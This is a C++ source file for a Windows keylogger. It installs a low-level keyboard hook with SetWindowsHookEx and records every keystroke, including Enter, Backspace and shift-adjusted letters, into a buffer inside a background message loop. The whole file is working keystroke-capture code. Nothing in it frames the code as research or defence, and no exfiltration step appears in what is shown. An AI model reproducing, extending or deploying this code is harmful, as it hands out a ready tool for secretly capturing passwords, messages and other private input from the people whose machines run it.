#include "keylogger.h"

HHOOK hKeyboardHook;
std::vector<char> keylogger::buffer = std::vector<char>();
__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
    {
        KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
        DWORD dwMsg = 1;
        dwMsg += hooked_key.scanCode << 16;
        dwMsg += hooked_key.flags << 24;
        char lpszKeyName[1024] = { 0 };

        int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;

        int key = hooked_key.vkCode;

        switch (key) {
        case VK_RETURN:
            keylogger::buffer.push_back('\n');
            break;
        case VK_BACK:
            keylogger::buffer.pop_back();
            break;
        default:
            if (key >= 'A' && key <= 'Z')
            {
                if (GetAsyncKeyState(VK_SHIFT) >= 0) key += 32;

            }
            keylogger::buffer.push_back(key);
            break;
        }


    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void MessageLoop()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

DWORD WINAPI my_HotKey(LPVOID lpParm)
{
    keylogger::buffer.reserve(1048);

    HINSTANCE hInstance = GetModuleHandle(NULL);
    if (!hInstance) hInstance = LoadLibrary((LPCSTR)lpParm);
    if (!hInstance) return 1;

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, hInstance, NULL);
    MessageLoop();
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}
